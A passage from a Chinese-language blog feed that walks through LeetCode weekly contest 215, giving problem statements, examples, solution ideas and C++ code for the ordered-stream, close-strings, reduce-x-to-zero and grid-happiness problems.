class=&quot;built_in&quot;&gt;cout&lt;/span&gt;&amp;lt;&amp;lt;ans&amp;lt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; t;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;cin&lt;/span&gt;&amp;gt;&amp;gt;t;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; t; ++i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;cout&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=&quot;string&quot;&gt;&quot;Case #&quot;&lt;/span&gt;&amp;lt;&amp;lt;i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=&quot;string&quot;&gt;&quot;: &quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        slove(i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="kickstart" scheme="http://yoursite.com/tags/kickstart/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛215场</title>
    <link href="http://yoursite.com/2020/11/15/226/"/>
    <id>http://yoursite.com/2020/11/15/226/</id>
    <published>2020-11-15T10:50:08.297Z</published>
    <updated>2020-11-18T15:48:08.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-215"><a href="#leetcode-contest-215" class="headerlink" title="leetcode  contest 215"></a>leetcode  contest 215</h1><p>周赛的题目，前三题比较容易，前三题基本上送分的题目，大概差不多也就40分钟搞定前三题，目测大概也就200名左右，最后一题确实不知道怎么做，直接放弃算了。</p><h2 id="5601-设计有序流"><a href="#5601-设计有序流" class="headerlink" title="5601. 设计有序流"></a>5601. 设计有序流</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>有 n 个 (id, value) 对，其中 id 是 1 到 n 之间的一个整数，value 是一个字符串。不存在 id 相同的两个 (id, value) 对。</p><a id="more"></a><p>设计一个流，以 任意 顺序获取 n 个 (id, value) 对，并在多次调用时 按 id 递增的顺序 返回一些值。</p><p>实现 OrderedStream 类：</p><ul><li><code>OrderedStream(int n)</code> 构造一个能接收 n 个值的流，并将当前指针 <code>ptr</code> 设为 1 。</li><li><code>String[] insert(int id, String value)</code> 向流中存储新的 <code>(id, value)</code>对。存储后：<ul><li>如果流存储有 <code>id = ptr</code>的 (id, value) 对，则找出从 <code>id = ptr</code>开始的 最长 id 连续递增序列 ，并 按顺序 返回与这些 id 关联的值的列表。然后，将 <code>ptr</code>更新为最后那个  id + 1 。</li><li>否则，返回一个空列表。</li></ul></li></ul><p>示例：<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">[<span class="string">"OrderedStream"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>]</span><br><span class="line">[[<span class="number">5</span>], [<span class="number">3</span>, <span class="string">"ccccc"</span>], [<span class="number">1</span>, <span class="string">"aaaaa"</span>], [<span class="number">2</span>, <span class="string">"bbbbb"</span>], [<span class="number">5</span>, <span class="string">"eeeee"</span>], [<span class="number">4</span>, <span class="string">"ddddd"</span>]]</span><br><span class="line">输出</span><br><span class="line">[null, [], [<span class="string">"aaaaa"</span>], [<span class="string">"bbbbb"</span>, <span class="string">"ccccc"</span>], [], [<span class="string">"ddddd"</span>, <span class="string">"eeeee"</span>]]</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line"><span class="symbol">OrderedStream</span> os= new <span class="symbol">OrderedStream</span>(<span class="number">5</span>);</span><br><span class="line">os.insert(<span class="number">3</span>, <span class="string">"ccccc"</span>); // 插入 (<span class="number">3</span>, <span class="string">"ccccc"</span>)，返回 []</span><br><span class="line">os.insert(<span class="number">1</span>, <span class="string">"aaaaa"</span>); // 插入 (<span class="number">1</span>, <span class="string">"aaaaa"</span>)，返回 [<span class="string">"aaaaa"</span>]</span><br><span class="line">os.insert(<span class="number">2</span>, <span class="string">"bbbbb"</span>); // 插入 (<span class="number">2</span>, <span class="string">"bbbbb"</span>)，返回 [<span class="string">"bbbbb"</span>, <span class="string">"ccccc"</span>]</span><br><span class="line">os.insert(<span class="number">5</span>, <span class="string">"eeeee"</span>); // 插入 (<span class="number">5</span>, <span class="string">"eeeee"</span>)，返回 []</span><br><span class="line">os.insert(<span class="number">4</span>, <span class="string">"ddddd"</span>); // 插入 (<span class="number">4</span>, <span class="string">"ddddd"</span>)，返回 [<span class="string">"ddddd"</span>, <span class="string">"eeeee"</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 1000</code></li><li><code>1 &lt;= id &lt;= n</code></li><li><code>value.length == 5</code></li><li><code>value</code> 仅由小写字母组成</li><li>每次调用 <code>insert</code> 都会使用一个唯一的 <code>id</code></li><li>恰好调用 <code>n</code> 次 <code>insert</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/design-an-ordered-stream" target="_blank" rel="noopener">https://leetcode-cn.com/problems/design-an-ordered-stream</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>题目太罗嗦了，真心是垃圾题目啊。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderedStream</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    OrderedStream(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;ptr = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;cap = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; insert(<span class="keyword">int</span> id, <span class="built_in">string</span> value) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; ans;</span><br><span class="line">        arr[id] = value;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = ptr; i &lt;= <span class="number">1000</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr.count(i))&#123;</span><br><span class="line">                ans.push_back(arr[i]);</span><br><span class="line">                ptr = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; arr;</span><br><span class="line">    <span class="keyword">int</span> ptr;</span><br><span class="line">    <span class="keyword">int</span> cap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your OrderedStream object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * OrderedStream* obj = new OrderedStream(n);</span></span><br><span class="line"><span class="comment"> * vector&lt;string&gt; param_1 = obj-&gt;insert(id,value);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5603-确定两个字符串是否接近"><a href="#5603-确定两个字符串是否接近" class="headerlink" title="5603. 确定两个字符串是否接近"></a>5603. 确定两个字符串是否接近</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>如果可以使用以下操作从一个字符串得到另一个字符串，则认为两个字符串 接近 ：</p><ul><li>操作 1：交换任意两个 现有 字符。<ul><li>例如，abcde -&gt; aecdb</li></ul></li><li>操作 2：将一个 现有 字符的每次出现转换为另一个 现有 字符，并对另一个字符执行相同的操作。<ul><li>例如，aacabb -&gt; bbcbaa（所有 a 转化为 b ，而所有的 b 转换为 a ）<br>你可以根据需要对任意一个字符串多次使用这两种操作。</li></ul></li></ul><p>给你两个字符串，word1 和 word2 。如果 word1 和 word2 接近 ，就返回 true ；否则，返回 false 。</p><p>示例 1：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 = <span class="string">"abc"</span>, word2 = <span class="string">"bca"</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：<span class="number">2</span> 次操作从 word1 获得 word2 。</span><br><span class="line">执行操作 <span class="number">1</span>：<span class="string">"abc"</span> -&gt; <span class="string">"acb"</span></span><br><span class="line">执行操作 <span class="number">1</span>：<span class="string">"acb"</span> -&gt; <span class="string">"bca"</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span> = <span class="string">"a"</span>, <span class="attr">word2</span> = <span class="string">"aa"</span></span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：不管执行多少次操作，都无法从 word1 得到 word2 ，反之亦然。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 = <span class="string">"cabbba"</span>, word2 = <span class="string">"abbccc"</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：<span class="number">3</span> 次操作从 word1 获得 word2 。</span><br><span class="line">执行操作 <span class="number">1</span>：<span class="string">"cabbba"</span> -&gt; <span class="string">"caabbb"</span></span><br><span class="line">执行操作 <span class="number">2</span>：<span class="string">"caabbb"</span> -&gt; <span class="string">"baaccc"</span></span><br><span class="line">执行操作 <span class="number">2</span>：<span class="string">"baaccc"</span> -&gt; <span class="string">"abbccc"</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span> = <span class="string">"cabbba"</span>, <span class="attr">word2</span> = <span class="string">"aabbss"</span></span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：不管执行多少次操作，都无法从 word1 得到 word2 ，反之亦然。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= word1.length, word2.length &lt;= 105</code></li><li><code>word1</code> 和 <code>word2</code> 仅包含小写英文字母</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/determine-if-two-strings-are-close" target="_blank" rel="noopener">https://leetcode-cn.com/problems/determine-if-two-strings-are-close</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排序</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>初看这个题目没有想太明白，后来想明白了，题目有一个是交换字母数量，假设字符中的各个字符的数量和种类都与目标字符串相同，则我们知道肯定可以通过操作<code>1</code>的交换让两个字符串相等。</li><li>首先我们比较字符串的长度是否相等，如果不相等直接返回。</li><li>再次我们比较数目的种类，如果字符的种类有差别也直接返回。</li><li>最后我们比较所有字符出现的次数，因为题目中规定，对于不同的字符，可以进行数量交换，此时我们只需要比较所有字符的统计数量，比较统计数量是否相等即可，因为我们总能通过交换让相同的字符数量变为相等。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">closeStrings</span><span class="params">(<span class="built_in">string</span> word1, <span class="built_in">string</span> word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.size();</span><br><span class="line">        <span class="keyword">int</span> n = word2.size();</span><br><span class="line">        <span class="keyword">if</span>(m != n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt1(<span class="number">26</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt2(<span class="number">26</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : word1) cnt1[c-<span class="string">'a'</span>]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : word2) cnt2[c-<span class="string">'a'</span>]++;</span><br><span class="line">        <span class="comment">/*check*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[i] == <span class="number">0</span> &amp;&amp; cnt2[i] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[i] != <span class="number">0</span> &amp;&amp; cnt2[i] == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(cnt1.begin(),cnt1.end());</span><br><span class="line">        sort(cnt2.begin(),cnt2.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[i] != cnt2[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5602-将-x-减到-0-的最小操作数"><a href="#5602-将-x-减到-0-的最小操作数" class="headerlink" title="5602. 将 x 减到 0 的最小操作数"></a>5602. 将 x 减到 0 的最小操作数</h2><p>给你一个整数数组 <code>nums</code>和一个整数 x 。每一次操作时，你应当移除数组 <code>nums</code>最左边或最右边的元素，然后从 <code>x</code>中减去该元素的值。请注意，需要 修改 数组以供接下来的操作使用。</p><p>如果可以将<code>x</code>恰好 减到 0 ，返回 最小操作数 ；否则，返回 -1 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>], x = <span class="number">5</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：最佳解决方案是移除后两个元素，将 x 减到 <span class="number">0</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>], x = <span class="number">4</span></span><br><span class="line">输出：<span class="number">-1</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">20</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>], x = <span class="number">10</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：最佳解决方案是移除后三个元素和前两个元素（总共 <span class="number">5</span> 次操作），将 x 减到 <span class="number">0</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 104</code></li><li><code>1 &lt;= x &lt;= 109</code><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><a href="https://leetcode-cn.com/problems/minimum-operations-to-reduce-x-to-zero" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-operations-to-reduce-x-to-zero</a><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>这个题目非常简单，因为题目中要求只能从数组的头部和尾部取数据，因此我们只需要保证前缀和后缀的和等于<code>x</code>即可，我们只需要求出复合要求的最短的前缀和后缀的长度之和即可为目标，非常常规的题目，没有太多新意。</li><li>我们可以用<code>hash</code>来存储前缀和，我们求后缀和的同时，同时计算<code>x-suffix</code>是否在前缀和中能够查找到。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minOperations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n+<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prefix(n,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*prefix sum*/</span></span><br><span class="line">        prefix[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        cnt[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) prefix[i] = prefix[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cnt[prefix[i]] = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(cnt.count(x)) ans = cnt[x];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> suffix = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            suffix += nums[i];</span><br><span class="line">            <span class="keyword">if</span>(cnt.count(x-suffix)) ans = min(ans,n-i + cnt[x-suffix]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans &gt; n ? <span class="number">-1</span> : ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="5604-最大化网格幸福感"><a href="#5604-最大化网格幸福感" class="headerlink" title="5604. 最大化网格幸福感"></a>5604. 最大化网格幸福感</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你四个整数 <code>m、n、introvertsCount 和 extrovertsCount</code>。有一个 <code>m x n</code>网格，和两种类型的人：内向的人和外向的人。总共有 <code>introvertsCount</code> 个内向的人和 <code>extrovertsCount</code>个外向的人。</p><p>请你决定网格中应当居住多少人，并为每个人分配一个网格单元。 注意，不必 让所有人都生活在网格中。</p><p>每个人的 幸福感 计算如下：</p><ul><li>内向的人 开始 时有 <code>120</code> 个幸福感，但每存在一个邻居（内向的或外向的）他都会 失去  <code>30</code> 个幸福感。</li><li>外向的人 开始 时有<code>40</code>个幸福感，每存在一个邻居（内向的或外向的）他都会 得到  <code>20</code>个幸福感。<br>邻居是指居住在一个人所在单元的上、下、左、右四个直接相邻的单元中的其他人。</li></ul><p>网格幸福感 是每个人幸福感的 总和 。 返回 最大可能的网格幸福感 。</p><p>示例 1：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：m = <span class="number">2</span>, n = <span class="number">3</span>, <span class="built_in">int</span>rovertsCount = <span class="number">1</span>, extrovertsCount = <span class="number">2</span></span><br><span class="line">输出：<span class="number">240</span></span><br><span class="line">解释：假设网格坐标 (row, column) 从 <span class="number">1</span> 开始编号。</span><br><span class="line">将内向的人放置在单元 (<span class="number">1</span>,<span class="number">1</span>) ，将外向的人放置在单元 (<span class="number">1</span>,<span class="number">3</span>) 和 (<span class="number">2</span>,<span class="number">3</span>) 。</span><br><span class="line">- 位于 (<span class="number">1</span>,<span class="number">1</span>) 的内向的人的幸福感：<span class="number">120</span>（初始幸福感）- (<span class="number">0</span> * <span class="number">30</span>)（<span class="number">0</span> 位邻居）= <span class="number">120</span></span><br><span class="line">- 位于 (<span class="number">1</span>,<span class="number">3</span>) 的外向的人的幸福感：<span class="number">40</span>（初始幸福感）+ (<span class="number">1</span> * <span class="number">20</span>)（<span class="number">1</span> 位邻居）= <span class="number">60</span></span><br><span class="line">- 位于 (<span class="number">2</span>,<span class="number">3</span>) 的外向的人的幸福感：<span class="number">40</span>（初始幸福感）+ (<span class="number">1</span> * <span class="number">20</span>)（<span class="number">1</span> 位邻居）= <span class="number">60</span></span><br><span class="line">网格幸福感为：<span class="number">120</span> + <span class="number">60</span> + <span class="number">60</span> = <span class="number">240</span></span><br><span class="line">上图展示该示例对应网格中每个人的幸福感。内向的人在浅绿色单元中，而外向的人在浅紫色单元中。</span><br></pre></td></tr></table></figure><p>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：m = <span class="number">3</span>, n = <span class="number">1</span>, <span class="built_in">int</span>rovertsCount = <span class="number">2</span>, extrovertsCount = <span class="number">1</span></span><br><span class="line">输出：<span class="number">260</span></span><br><span class="line">解释：将内向的人放置在单元 (<span class="number">1</span>,<span class="number">1</span>) 和 (<span class="number">3</span>,<span class="number">1</span>) ，将外向的人放置在单元 (<span class="number">2</span>,<span class="number">1</span>) 。</span><br><span class="line">- 位于 (<span class="number">1</span>,<span class="number">1</span>) 的内向的人的幸福感：<span class="number">120</span>（初始幸福感）- (<span class="number">1</span> * <span class="number">30</span>)（<span class="number">1</span> 位邻居）= <span class="number">90</span></span><br><span class="line">- 位于 (<span class="number">2</span>,<span class="number">1</span>) 的外向的人的幸福感：<span class="number">40</span>（初始幸福感）+ (<span class="number">2</span> * <span class="number">20</span>)（<span class="number">2</span> 位邻居）= <span class="number">80</span></span><br><span class="line">- 位于 (<span class="number">3</span>,<span class="number">1</span>) 的内向的人的幸福感：<span class="number">120</span>（初始幸福感）- (<span class="number">1</span> * <span class="number">30</span>)（<span class="number">1</span> 位邻居）= <span class="number">90</span></span><br><span class="line">网格幸福感为 <span class="number">90</span> + <span class="number">80</span> + <span class="number">90</span> = <span class="number">260</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：m = <span class="number">2</span>, n = <span class="number">2</span>, <span class="built_in">int</span>rovertsCount = <span class="number">4</span>, extrovertsCount = <span class="number">0</span></span><br><span class="line">输出：<span class="number">240</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= m, n &lt;= 5</code></li><li><code>0 &lt;= introvertsCount, extrovertsCount &lt;= min(m * n, 6)</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/maximize-grid-happiness" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximize-grid-happiness</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>第一次见到这种轮廓的动态规划，题目还是非常有意思，终于看懂了@cuiaoxiang的代码，知道了轮廓<code>dp</code>的大概含义。大致意思，就是以当前坐标<code>(x,y)</code>之前的最后外面的一排形成的轮廓的二维状态码形成的动态规划，第一次见到这种题目。具体可以参考解答：<a href="https://leetcode-cn.com/problems/maximize-grid-happiness/solution/zui-da-hua-wang-ge-xing-fu-gan-by-zerotrac2/672331/" target="_blank" rel="noopener">最大化网格幸福感</a>.</li><li>这个题目跟<a href="https://leetcode-cn.com/problems/maximum-students-taking-exam/" target="_blank" rel="noopener">1349. 参加考试的最大学生数</a>,<a href="https://leetcode-cn.com/problems/broken-board-dominoes/" target="_blank" rel="noopener">LCP 04. 覆盖</a>有的一拼，竟然也可以用轮廓<code>dp</code>做出来，真是牛逼的算法，附件的代码中有用轮廓<code>dp</code>完成的代码。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 